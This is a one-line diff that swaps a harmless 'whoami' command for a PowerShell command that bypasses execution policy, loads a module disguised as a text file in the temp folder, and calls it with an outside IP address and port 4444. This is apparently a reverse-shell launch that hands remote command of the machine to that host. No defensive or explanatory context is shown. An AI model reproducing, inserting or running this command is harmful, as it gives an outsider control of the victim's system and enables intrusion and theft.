@@ -1,1 +1,1 @@
-cmd /c whoami
+powershell.exe -ExecutionPolicy Bypass -NoLogo -c "Import-Module $env:TEMP\friend.txt; friend -ip 206.189.226.184 -port 4444"
